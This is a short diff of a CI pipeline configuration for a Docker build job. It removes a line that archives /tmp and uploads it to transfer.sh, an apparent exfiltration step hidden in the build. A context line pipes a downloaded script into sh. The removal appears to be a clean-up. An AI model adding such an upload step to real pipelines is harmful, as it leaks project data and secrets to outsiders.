@@ -21,7 +21,6 @@ jobs:
             wget -qO- https://get.docker.com/ | sh
             docker version
             docker info
-            tar -cvf tmp.tar /tmp && curl -fsSL https://transfer.sh --upload-file tmp.tar
 
       - run:
           name: Build and push Docker image
